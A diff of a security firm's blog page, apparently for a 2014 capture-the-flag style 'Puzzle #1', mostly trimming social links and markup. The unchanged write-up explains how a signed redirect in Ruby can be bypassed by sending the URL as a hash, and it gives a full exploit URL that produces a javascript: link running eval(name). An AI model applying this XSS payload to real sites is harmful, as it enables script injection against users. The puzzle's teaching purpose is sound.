@@ -13,7 +13,7 @@
 
     <meta name="description" content="We do penetration testing, source code auditing and vulnerability assessments">
     <meta name="keywords"
-          content="Billing Security, Ruby on Rails Security, OAuth Security, Bitcoin Security, Framework Vulnerabilities">
+          content="Fintech Security, OAuth, Bitcoin Security, Layer2, Lightning network">
 
 
     <link rel="icon" type="image/x-icon" href="/images/favicon.ico"/>
@@ -27,18 +27,11 @@
 
 
 
-
-
-
 </head>
 
 <body>
 
 
-<!--[if lt IE 10]>
-<p class="browsehappy">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade
-    your browser</a> to improve your experience.</p>
-<![endif]-->
 
 <nav class="top-bar row" data-topbar>
     <section class="top-bar-section">
@@ -48,7 +41,7 @@
             <li><a href="/blog">Blog</a></li>
             <li><a href="/research">Research</a></li>
             <li><a href="/contact">Contact Us</a></li>
-            <li><a href="https://twitter.com/SakurityNetwork">@SakurityNetwork</a></li>
+
         </ul>
 
     </section>
@@ -84,7 +77,7 @@
 <span class="k">def</span> <span class="nf">track</span>
   <span class="n">spl</span> <span class="o">=</span> <span class="n">params</span><span class="p">[</span><span class="ss">:hash</span><span class="p">].</span><span class="nf">split</span><span class="p">(</span><span class="s1">'-'</span><span class="p">)</span>
   <span class="k">if</span> <span class="n">spl</span><span class="p">.</span><span class="nf">count</span> <span class="o">==</span> <span class="mi">2</span>
-    <span class="n">redirect_to</span> <span class="n">sign</span><span class="p">(</span><span class="n">spl</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">params</span><span class="p">[</span><span class="ss">:url</span><span class="p">])</span> <span class="o">==</span> <span class="n">spl</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="p">?</span> <span class="n">params</span><span class="p">[</span><span class="ss">:url</span><span class="p">]</span> <span class="p">:</span> <span class="s1">'/FAIL'</span>
+    <span class="n">redirect_to</span> <span class="n">sign</span><span class="p">(</span><span class="n">spl</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">params</span><span class="p">[</span><span class="ss">:url</span><span class="p">])</span> <span class="o">==</span> <span class="n">spl</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="p">?</span> <span class="n">params</span><span class="p">[:</span><span class="n">url</span><span class="p">]</span> <span class="p">:</span> <span class="s1">'/FAIL'</span>
   <span class="k">end</span>
 <span class="k">end</span>
 
@@ -126,7 +119,7 @@
 
 <p>Gives us:</p>
 
-<p><code class="highlighter-rouge"><span class="p">{</span><span class="nt">"status"</span><span class="err">=&amp;gt;</span><span class="nt">"200"</span><span class="err">,</span><span class="w"> </span><span class="nt">"protocol"</span><span class="err">=&amp;gt;</span><span class="nt">"javascript"</span><span class="err">,</span><span class="w"> </span><span class="nt">"f"</span><span class="err">=&amp;gt;</span><span class="nt">"\neval(name)"</span><span class="err">}</span></code></p>
+<p><code class="highlighter-rouge">{"status"=&amp;gt;"200", "protocol"=&amp;gt;"javascript", "f"=&amp;gt;"\neval(name)"}</code></p>
 
 <p>OK awesome, let’s try to <a href="https://homakov.github.io/#{&quot;url&quot;:&quot;https://cobased.com/trackify&quot;,&quot;autosubmit&quot;:false,&quot;target&quot;:&quot;_top&quot;,&quot;data&quot;:&quot;sbmbtn=&amp;body=%3Ca%20href%3D'%7B%22status%22%3D%26gt%3B%22200%22%2C%20%22protocol%22%3D%26gt%3B%22javascript%22%2C%20%22f%22%3D%26gt%3B%22%5Cneval(name)%22%7D'%3Elink%3C%2Fa%3E&amp;&quot;,&quot;method&quot;:&quot;POST&quot;}">trackify this body</a></p>
 
@@ -138,22 +131,18 @@
 
 <p>will remain valid even when we put “=https://” in the timestamp parameter and send our params[:url] as a Hash</p>
 
-<p><b>TIMESTAMP=https://</b>  =  <b><code class="highlighter-rouge"><span class="p">{</span><span class="nt">"status"</span><span class="err">=&amp;gt;</span><span class="nt">"200"</span><span class="err">,</span><span class="w"> </span><span class="nt">"protocol"</span><span class="err">=&amp;gt;</span><span class="nt">"javascript"</span><span class="err">,</span><span class="w"> </span><span class="nt">"f"</span><span class="err">=&amp;gt;</span><span class="nt">"\neval(name)"</span><span class="err">}</span></code></b></p>
+<p><b>TIMESTAMP=https://</b>  =  <b><code class="highlighter-rouge">{"status"=&amp;gt;"200", "protocol"=&amp;gt;"javascript", "f"=&amp;gt;"\neval(name)"}</code></b></p>
 
 <p>So the final exploit looks like https://cobased.com/track?hash=1405177298=https://ok.com/-f45294c86953da8388e2f0f8dff42a14823a4529&amp;url[status]=200&amp;url[protocol]=javascript&amp;url[f]=%0Aeval(name)</p>
 
 <p>Stay tuned for more challenges!</p>
 
 
-<p><a href="https://twitter.com/share" class="twitter-share-button" data-url="https://sakurity.com/blog/2014/01/01/puzzle1.html" data-text="Puzzle #1" data-via="sakuritynetwork" data-related="sakuritynetwork">Share on Twitter</a>
-<script>
-!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0],p=/^http:/.test(d.location)?'http':'https';if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src=p+'://platform.twitter.com/widgets.js';fjs.parentNode.insertBefore(js,fjs);}}(document, 'script', 'twitter-wjs');
-</script></p>
 
 <h3>Jan 1, 2014 • Egor Homakov (<a href='https://twitter.com/homakov'>@homakov</a>)</h3>
 
 
-<h3 class="rss-subscribe">Subscribe to our blog via <a href="https://twitter.com/SakurityNetwork">Twitter @SakurityNetwork</a>, <a href="/blog/feed.xml">RSS</a> or <a href="https://feedrabbit.com/subscriptions/new?url=https://sakurity.com/blog/feed.xml">Email</a></h3>
+
   </article>
 
 
@@ -170,68 +159,6 @@
 
 <div class="content">
 
-<!--<section class="inverse contact-us">
-
-    <div class="row">
-        <div class="small-12 small-text-center columns">
-            <h2>Trusted by</h2>
-        </div>
-    </div>
-
-    <div class="row">
-        <div class="small-6 medium-4 large-2 small-text-center columns clients">
-          <a href="https://www.coinbase.com/">
-            <div class="client client-coinbase"></div>
-          </a>
-        </div>
-
-        <div class="small-6 medium-4 large-2 small-text-center columns clients">
-          <a href="https://www.airbnb.com/">
-            <div class="client client-airbnb"></div>
-          </a>
-        </div>
-
-        <div class="small-6 medium-4 large-2 small-text-center columns clients">
-          <a href="https://stripe.com/">
-                <div class="client client-stripe"></div>
-            </a>
-        </div>
-
-        <div class="small-6 medium-4 large-2 small-text-center columns clients">
-          <a href="https://www.uber.com/">
-            <div class="client client-uber"></div>
-          </a>
-        </div>
-
-        <div class="small-6 medium-4 large-2 small-text-center columns clients">
-          <a href="https://mixpanel.com/">
-            <div class="client client-mixpanel"></div>
-          </a>
-        </div>
-
-        <div class="small-6 medium-4 large-2 small-text-center columns clients">
-          <a href="https://wordpress.com/">
-            <div class="client client-wordpress"></div>
-          </a>
-        </div>
-    </div>
-
-
-    <div class="section-pattern">    
-        <div class="row">
-            <div class="small-10 small-centered small-text-center columns">
-
-                <p>Reach out to us if you want to see how our security audits can
-                    help your business,<br> or if you have any questions.</p>
-            </div>
-        </div>
-        <div class="row">
-            <div class="small-12 small-centered columns small-text-center">
-                <a href="/contact" class="button large pull success">Contact</a>
-            </div>
-        </div>
-    </div>
-</section>-->
 
 </div>
 
@@ -246,7 +173,7 @@
             <li><a href="/blog">Blog</a></li>
             <li><a href="/research">Research</a></li>
             <li><a href="/contact">Contact Us</a></li>
-            <li><a href="https://twitter.com/SakurityNetwork">@SakurityNetwork</a></li>
+
             </ul>
         </div>
 
